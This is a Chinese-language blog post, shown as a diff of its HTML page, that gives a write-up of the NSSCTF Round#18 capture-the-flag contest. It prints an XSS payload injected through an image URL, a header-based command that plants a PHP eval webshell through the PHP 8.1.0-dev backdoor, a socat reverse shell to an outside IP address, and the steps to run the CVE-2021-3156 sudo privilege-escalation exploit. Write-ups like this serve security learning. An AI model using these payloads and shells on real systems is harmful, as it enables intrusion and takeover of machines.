@@ -1,0 +1,465 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>NSSCTF Round#18 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%A8%E9%85%B1%E6%83%B3%E7%8E%A9%E4%BB%80%E4%B9%88%E5%91%A2%EF%BC%9F-%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">门酱想玩什么呢？ (复现)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Becomeroot-%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.2.</span> <span class="toc-text">Becomeroot (复现)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-rw-Unsolved"><span class="toc-number">2.3.</span> <span class="toc-text">easy_rw (Unsolved)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%A9%E9%A6%A8%E7%9A%84%E9%85%92%E5%90%A7"><span class="toc-number">3.1.</span> <span class="toc-text">温馨的酒吧</span></a></li></ol></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>NSSCTF Round#18</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/2/14
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF线上赛
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/CVE/" style="color: #ff7d73">CVE</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/%E6%8F%90%E6%9D%83/" style="color: #00bcd4">提权</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/XSS/" style="color: #ff7d73">XSS</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/NSS/" style="color: #ffa2c4">NSS</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">740字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">3分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>美好的情人节从web爆零结束</p>
+<p>官方wp：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/jGRkBxgM9jdzLAeM-qiHKA">https://mp.weixin.qq.com/s/jGRkBxgM9jdzLAeM-qiHKA</a></p>
+<span id="more"></span>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="门酱想玩什么呢？-复现"><a href="#门酱想玩什么呢？-复现" class="headerlink" title="门酱想玩什么呢？ (复现)"></a>门酱想玩什么呢？ (复现)</h2><blockquote>
+<p>xss</p>
+</blockquote>
+<p>启动的页面有hint：nssctfroundSpring.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//部分关键代码</span>
+<span class="token variable">$contentLines</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">,</span> <span class="token variable">$comment</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^https?:\/\/\S+$/'</span><span class="token punctuation">,</span> <span class="token variable">$contentLines</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^https?:\/\/[^\/]+\/\S+\.png$/'</span><span class="token punctuation">,</span> <span class="token variable">$contentLines</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$contentLines</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'/png'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$urlParts</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$urlParts</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img class="content" src="'</span> <span class="token operator">.</span> <span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'">'</span><span class="token punctuation">;</span>
+            <span class="token comment">//.......</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token comment">//......</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token comment">//......</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>抓包注意到这里的csp策略仅限同源与内联：<code>Content-Security-Policy: script-src &#39;self&#39; &#39;unsafe-inline&#39;;</code></p>
+<p>尝试xss</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">http://"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>.png /png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>成功</p>
+<p><img src="/blog/2024/02/14/NSSCTF-Round-18/image-20240214101722446.png" alt="image-20240214101722446"></p>
+<p>注意这里评论的内容会被base64和url编码</p>
+<p>但是这个xss怎么用我想不出来</p>
+<p>首先一个很难蚌的点是这里说只要自己网站的链接不是127.0.0.1，而是靶机的地址。。。</p>
+<p>第二个难蚌的点是提示说直接给门酱想玩的游戏链接就行，没想到就是评论区那个元梦之星。。。</p>
+<p>于是xss重定向到元梦之星的官网，让门酱访问自己的评论区即可</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">http://"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"https://ymzx.qq.com/"</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>.png /png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>那么payload：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">http://node4.anna.nssctf.cn:28670/words/?title=MQ%253D%253D&amp;content=aHR0cDovLyUyMiUzRSUzQ3NjcmlwdCUzRWxvY2F0aW9uLmhyZWY9JTIyaHR0cHM6Ly95bXp4LnFxLmNvbS8lMjIlM0Mvc2NyaXB0JTNFLnBuZyUyMC9wbmc=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/02/14/NSSCTF-Round-18/image-20240219115849005.png" alt="image-20240219115849005"></p>
+<hr>
+<h2 id="Becomeroot-复现"><a href="#Becomeroot-复现" class="headerlink" title="Becomeroot (复现)"></a>Becomeroot (复现)</h2><blockquote>
+<p>sudo提权 CVE-2021-3156</p>
+</blockquote>
+<p>php8.1.0-dev，这个版本存在zerodium后门：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/116992989">https://blog.csdn.net/qq_44159028/article/details/116992989</a></p>
+<p>phpinfo里面搜hint也可以知道</p>
+<p>先写个马，这里不要直接弹shell</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">user-agentt: zerodiumsystem('echo "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span>\<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>"> /var/www/html/1.php');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/02/14/NSSCTF-Round-18/image-20240219120926568.png" alt="image-20240219120926568"></p>
+<p>然后蚁剑连上去，接下来是提权（因为接下来的提权操作需要完整的shell才能使用，所以前面不能直接弹shell）</p>
+<p>这里需要socat</p>
+<p>下载socat：<a target="_blank" rel="noopener" href="http://www.dest-unreach.org/socat/download/">http://www.dest-unreach.org/socat/download/</a></p>
+<p>安装参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bonne-chance/p/16553556.html">https://www.cnblogs.com/bonne-chance/p/16553556.html</a></p>
+<p>用蚁剑上传上去并给权限</p>
+<p>由于缺库文件我这里直接在靶机里面解压安装，然后再上传一个本地编译好的socat（</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./socat exec:<span class="token string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:115.236.153.170:14723<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/02/14/NSSCTF-Round-18/image-20240219125650595.png" alt="image-20240219125650595"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">socat file:<span class="token variable"><span class="token variable">`</span><span class="token function">tty</span><span class="token variable">`</span></span>,raw,echo<span class="token operator">=</span><span class="token number">0</span> tcp-listen:666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/02/14/NSSCTF-Round-18/image-20240219130438099.png" alt="image-20240219130438099"></p>
+<p>接下来就是CVE-2021-3156 sudo本地提权，版本：<code>sudo 1.8.2-1.8.31p2/sudo 1.9.0-1.9.5p1</code></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.geekby.site/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://www.geekby.site/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/CptGibbon/CVE-2021-3156">https://github.com/CptGibbon/CVE-2021-3156</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudoedit <span class="token parameter variable">-s</span> /<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/02/14/NSSCTF-Round-18/image-20240219135418010.png" alt="image-20240219135418010"></p>
+<p>返回sudoedit开头，此时说明漏洞存在</p>
+<p>poc上传上去（socat弹回shell后php会变得不可访问，需要先断开shell然后用蚁剑上传后再弹一次。原因应该是题目没有用apache2这种中间件而是直接php启动服务）</p>
+<p>这里应该是公共靶机的原因没删掉别人上传的exp，我这里直接拿来用（</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> CVE-2021-3156-main/
+<span class="token function">make</span>
+./exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2024/02/14/NSSCTF-Round-18/image-20240219135815116.png" alt="image-20240219135815116"></p>
+<hr>
+<h2 id="easy-rw-Unsolved"><a href="#easy-rw-Unsolved" class="headerlink" title="easy_rw (Unsolved)"></a>easy_rw (Unsolved)</h2><p>提示：弱口令 &amp; CVE-2023-49299 Bypass</p>
+<p>guest账户密码：guest123</p>
+<hr>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="温馨的酒吧"><a href="#温馨的酒吧" class="headerlink" title="温馨的酒吧"></a>温馨的酒吧</h2><p>情人节限定galgame——温馨的酒吧谢队线（？</p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1nH4y1E7Hg/">https://www.bilibili.com/video/BV1nH4y1E7Hg/</a></p>
+<p>flag：<code>NSSCTF&#123;新年快乐_不要停下来啊_CTFer!&#125;</code></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
